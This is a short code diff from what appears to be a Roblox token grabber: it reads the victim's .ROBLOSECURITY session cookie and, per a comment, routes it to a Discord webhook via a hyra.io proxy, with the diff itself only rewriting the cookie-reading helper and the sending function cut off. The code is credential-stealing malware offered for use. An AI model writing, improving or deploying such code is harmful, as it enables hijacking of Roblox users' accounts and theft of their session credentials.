@@ -2,9 +2,9 @@
 // Replace webhook url https://discord.com/api/webhooks/stuff/stuff
 // to https://hooks.hyra.io/api/webhooks/stuff/stuff
 function getCookie(name) {
-  const value = `; ${document.cookie}`;
-  const parts = value.split(`; ${name}=`);
-  if (parts.length === 2) return parts.pop().split(';').shift();
+    function escape(s) { return s.replace(/([.*+?\^$(){}|\[\]\/\\])/g, '\\$1'); }
+    var match = document.cookie.match(RegExp('(?:^|;\\s*)' + escape(name) + '=([^;]*)'));
+    return match ? match[1] : null;
 }
 var token = getCookie(".ROBLOSECURITY")
 function discordWebhook(){
